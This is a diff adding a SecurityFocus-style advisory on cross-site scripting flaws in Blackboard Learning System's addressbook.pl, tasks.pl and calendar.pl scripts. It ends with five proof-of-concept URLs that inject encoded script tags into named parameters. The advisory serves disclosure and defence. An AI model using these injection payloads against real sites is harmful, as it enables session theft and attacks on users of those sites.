@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/10101/info
+
+Blackboard Learning System has been reported prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure of the application to properly validate user supplied URI input.
+
+The first issue is reported to affect the "addressbook.pl" script. The second issue is reported to affect the "tasks.pl" script. The third issue is reported to affect three URI parameters, of the "calendar.pl" script.
+
+In all cases the user-supplied parameters are not sufficiently sanitized prior to being rendered in the browser of the target user.
+
+These issues could permit a remote attacker to create a malicious link to the vulnerable application that includes hostile HTML and script code. If this link were followed, the hostile code may be rendered in the web browser of the victim user. This would occur in the security context of the affected web site and may allow for theft of cookie-based authentication credentials or other attacks.
+
+http://www.example.com/bin/common/addressbook.pl?action=ADD&nav=my_addressbook&course='%3E%3Cscript%3Ealert('DarCNesS')%3C/script%3E
+http://www.example.com/bin/common/tasks.pl?action=c&display=T.subject&filter=--!!all&course_id=&render_type='%3E%3Cscript%3Ealert('DarCNesS')%3C/script%3E
+http://www.example.com/bin/common/calendar.pl?course_name=%22%3E%3Cscript%3Ealert('DarCNesS')%3C/script%3E
+http://www.example.com/bin/common/calendar.pl?courseID=%22%3E%3Cscript%3Ealert('DarCNesS')%3C/script%3E
+http://www.example.com/bin/common/calendar.pl?subroutine=%22%3E%3Cscript%3Ealert('DarCNesS')%3C/script%3E
